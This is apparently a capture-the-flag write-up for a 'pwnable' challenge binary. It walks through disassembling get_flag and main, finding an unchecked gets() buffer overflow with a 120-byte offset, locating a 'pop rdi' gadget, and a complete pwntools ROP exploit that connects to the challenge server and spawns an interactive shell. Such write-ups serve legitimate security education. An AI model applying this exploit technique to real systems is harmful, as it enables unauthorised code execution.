With objdump we have found a function called `get_flag`.
```shell
[marco@marco-xps139343 Desktop]$ objdump -t pwnable | grep get_flag
00000000004005ea g     F .text	0000000000000041              get_flag
```

Analizyng the function with gdb, we discovered the function compare the value in EDI with `0xdeadbeef`:
```gdb
[marco@marco-xps139343 Desktop]$ gdb-pwndbg pwnable 
Reading symbols from pwnable...
(No debugging symbols found in pwnable)
pwndbg: loaded 181 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> disassemble get_flag 
Dump of assembler code for function get_flag:
   0x00000000004005ea <+0>:	push   rbp
   0x00000000004005eb <+1>:	mov    rbp,rsp
   0x00000000004005ee <+4>:	sub    rsp,0x20
   0x00000000004005f2 <+8>:	mov    DWORD PTR [rbp-0x14],edi
   0x00000000004005f5 <+11>:	cmp    DWORD PTR [rbp-0x14],0xdeadbeef
   0x00000000004005fc <+18>:	jne    0x400628 <get_flag+62>
   0x00000000004005fe <+20>:	mov    QWORD PTR [rbp-0x10],0x400700
   0x0000000000400606 <+28>:	mov    QWORD PTR [rbp-0x8],0x0
   0x000000000040060e <+36>:	mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400612 <+40>:	lea    rcx,[rbp-0x10]
   0x0000000000400616 <+44>:	mov    edx,0x0
   0x000000000040061b <+49>:	mov    rsi,rcx
   0x000000000040061e <+52>:	mov    rdi,rax
   0x0000000000400621 <+55>:	call   0x400490 <execve@plt>
   0x0000000000400626 <+60>:	jmp    0x400629 <get_flag+63>
   0x0000000000400628 <+62>:	nop
   0x0000000000400629 <+63>:	leave  
   0x000000000040062a <+64>:	ret    
End of assembler dump.
```

The main function just get an input:
```gdb
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000004005b6 <+0>:	push   rbp
   0x00000000004005b7 <+1>:	mov    rbp,rsp
   0x00000000004005ba <+4>:	sub    rsp,0x70
   0x00000000004005be <+8>:	mov    edi,0x4006b8
   0x00000000004005c3 <+13>:	call   0x400470 <puts@plt>
   0x00000000004005c8 <+18>:	lea    rax,[rbp-0x70]
   0x00000000004005cc <+22>:	mov    rdi,rax
   0x00000000004005cf <+25>:	mov    eax,0x0
   0x00000000004005d4 <+30>:	call   0x4004a0 <gets@plt>
   0x00000000004005d9 <+35>:	mov    edi,0x4006ea
   0x00000000004005de <+40>:	call   0x400470 <puts@plt>
   0x00000000004005e3 <+45>:	mov    eax,0x1
   0x00000000004005e8 <+50>:	leave  
   0x00000000004005e9 <+51>:	ret    
End of assembler dump.
```

Running checksec:
```gdb
pwndbg> checksec
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   70 Symbols     No	0		1	/home/marco/Desktop/pwnable
```

Using cyclic we find the buffer is 120 bytes:
```gdb
pwndbg> cyclic 150
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
pwndbg> r
Starting program: /home/marco/Desktop/pwnable 
I really like strings! Please give me a good one!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
Thanks for the string

Program received signal SIGSEGV, Segmentation fault.
...
RSP  0x7fffffffdef8 ◂— 'faabgaabhaabiaabjaabkaablaabma'
...
pwndbg> cyclic -l 'faab'
120
```

So we build a ropchain which pop `0xdeadbeef` in EDI, and then jump in the function:
```shell
[marco@marco-xps139343 Desktop]$ ROPgadget --binary="pwnable" > gadgets
[marco@marco-xps139343 Desktop]$ cat gadgets | grep "pop rdi"
0x0000000000400693 : pop rdi ; ret
```

final exploit:
```python
from pwn import *

get_flag = 0x00000000004005ea
pop_rdi = 0x0000000000400693

payload = (("A"*120).encode())
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(get_flag)

p = remote('binary.utctf.live', 9002)
print(p.recvuntil('!\n').decode())
p.sendline(payload)
print(p.recvuntil('string\n').decode())
p.interactive()
```
